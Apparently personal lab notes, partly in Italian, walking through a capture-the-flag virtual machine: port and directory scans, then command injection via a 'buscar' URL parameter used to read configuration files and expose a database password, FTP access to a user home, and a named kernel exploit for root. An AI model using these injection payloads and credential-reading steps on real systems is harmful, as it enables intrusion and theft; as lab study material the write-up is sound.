

## sudo netdiscover -r 192.168.1.0/24

-> 192.168.1.13 blackbox

## sudo nmap -sV -sC -p- 192.168.1.13 

-p- scansiona tutte le porte (1-65535)

-sV rileva le versioni dei servizi

-sC usa gli script predefiniti di nmap

Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 16:43 +0200
Stats: 0:01:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 61.64% done; ETC: 16:45 (0:00:48 remaining)
Nmap scan report for 192.168.1.13
Host is up (0.0014s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Index of /
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-06-10 18:05  site/
|_
MAC Address: 08:00:27:73:C0:1E (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.34 seconds

## curl -v http://192.168.1.13

## gobuster dir -u http://192.168.1.13/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.13/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 277]
.hta                 (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
server-status        (Status: 403) [Size: 277]
site                 (Status: 301) [Size: 311] [--> http://192.168.1.13/site/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================


## gobuster dir -u http://192.168.1.13/site/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.13/site/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 277]
.hta                 (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
assets               (Status: 301) [Size: 318] [--> http://192.168.1.13/site/assets/]
css                  (Status: 301) [Size: 315] [--> http://192.168.1.13/site/css/]
index.html           (Status: 200) [Size: 10190]
js                   (Status: 301) [Size: 314] [--> http://192.168.1.13/site/js/]
wordpress            (Status: 301) [Size: 321] [--> http://192.168.1.13/site/wordpress/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

gobuster dir -u http://192.168.1.13/site/ -x php,html,txt,zip -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.13/site/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 277]
.hta.php             (Status: 403) [Size: 277]
.hta.txt             (Status: 403) [Size: 277]
.hta.html            (Status: 403) [Size: 277]
.htaccess.php        (Status: 403) [Size: 277]
.htaccess.zip        (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
.htaccess.txt        (Status: 403) [Size: 277]
.hta.zip             (Status: 403) [Size: 277]
.htaccess.html       (Status: 403) [Size: 277]
.htpasswd.txt        (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
.htpasswd.php        (Status: 403) [Size: 277]
.htpasswd.html       (Status: 403) [Size: 277]
.htpasswd.zip        (Status: 403) [Size: 277]
assets               (Status: 301) [Size: 318] [--> http://192.168.1.13/site/assets/]
css                  (Status: 301) [Size: 315] [--> http://192.168.1.13/site/css/]
index.html           (Status: 200) [Size: 10190]
index.html           (Status: 200) [Size: 10190]
js                   (Status: 301) [Size: 314] [--> http://192.168.1.13/site/js/]
wordpress            (Status: 301) [Size: 321] [--> http://192.168.1.13/site/wordpress/]
Progress: 23065 / 23065 (100.00%)
===============================================================
Finished
===============================================================

gobuster dir -u http://192.168.1.13/site/wordpress/ -x php,html,txt,zip,log,sql -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.13/site/wordpress/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,zip,log,sql,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.php             (Status: 403) [Size: 277]
.hta                 (Status: 403) [Size: 277]
.hta.html            (Status: 403) [Size: 277]
.hta.txt             (Status: 403) [Size: 277]
.hta.zip             (Status: 403) [Size: 277]
.hta.sql             (Status: 403) [Size: 277]
.hta.log             (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
.htaccess.txt        (Status: 403) [Size: 277]
.htaccess.zip        (Status: 403) [Size: 277]
.htpasswd.html       (Status: 403) [Size: 277]
.htaccess.php        (Status: 403) [Size: 277]
.htaccess.html       (Status: 403) [Size: 277]
.htaccess.log        (Status: 403) [Size: 277]
.htaccess.sql        (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
.htpasswd.php        (Status: 403) [Size: 277]
.htpasswd.zip        (Status: 403) [Size: 277]
.htpasswd.txt        (Status: 403) [Size: 277]
.htpasswd.log        (Status: 403) [Size: 277]
.htpasswd.sql        (Status: 403) [Size: 277]
config.php           (Status: 200) [Size: 87]
index.html           (Status: 200) [Size: 10190]
index.html           (Status: 200) [Size: 10190]
Progress: 32291 / 32291 (100.00%)
===============================================================
Finished
===============================================================

curl -s http://192.168.1.13/site/wordpress/config.php
Connection failed: Access denied for user 'desafio02'@'localhost' (using password: YES)  

curl -v http://192.168.1.13/site/wordpress/config.php
*   Trying 192.168.1.13:80...
* Established connection to 192.168.1.13 (192.168.1.13 port 80) from 192.168.1.10 port 35786 
* using HTTP/1.x
> GET /site/wordpress/config.php HTTP/1.1
> Host: 192.168.1.13
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 29 Jul 2026 10:02:45 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 87
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 192.168.1.13:80 left intact
Connection failed: Access denied for user 'desafio02'@'localhost' (using password: YES)    

trovato qualcosa ma strada fallita per non trovato password opunti di inserimento

curl -s "http://192.168.1.13/site/busque.php?buscar=find%20/%20-name%20config.php%202>/dev/null"
/var/www/html/site/wordpress/config.php


curl -s "http://192.168.1.13/site/busque.php?buscar=cat%20/var/www/html/site/wordpress/config.php"
<?php
$servername = "localhost";
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
?>

http://192.168.1.13/site/busque.php?buscar=ls%20-la%20%20/var/www/html/

total 16 drwxr-xr-x 3 root root 4096 Oct 31 2021 . drwxr-xr-x 3 root root 4096 Oct 31 2021 .. -rw-r--r-- 1 www-data www-data 336 Oct 31 2021 .backup drwxr-xr-x 6 www-data www-data 4096 Jun 10 2021 site 


curl -s "http://192.168.1.13/site/busque.php?buscar=cat%20/var/www/html/.backup"

$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);


ftp> cd /home/jangow01
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||65251|)
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Jun 10  2021 .
drwxr-xr-x    3 0        0            4096 Oct 31  2021 ..
-rw-------    1 1000     1000          200 Oct 31  2021 .bash_history
-rw-r--r--    1 1000     1000          220 Jun 10  2021 .bash_logout
-rw-r--r--    1 1000     1000         3771 Jun 10  2021 .bashrc
drwx------    2 1000     1000         4096 Jun 10  2021 .cache
drwxrwxr-x    2 1000     1000         4096 Jun 10  2021 .nano
-rw-r--r--    1 1000     1000          655 Jun 10  2021 .profile
-rw-r--r--    1 1000     1000            0 Jun 10  2021 .sudo_as_admin_successful
-rw-rw-r--    1 1000     1000           33 Jun 10  2021 user.txt
226 Directory send OK.


45010.c permette l'exploit e diventare root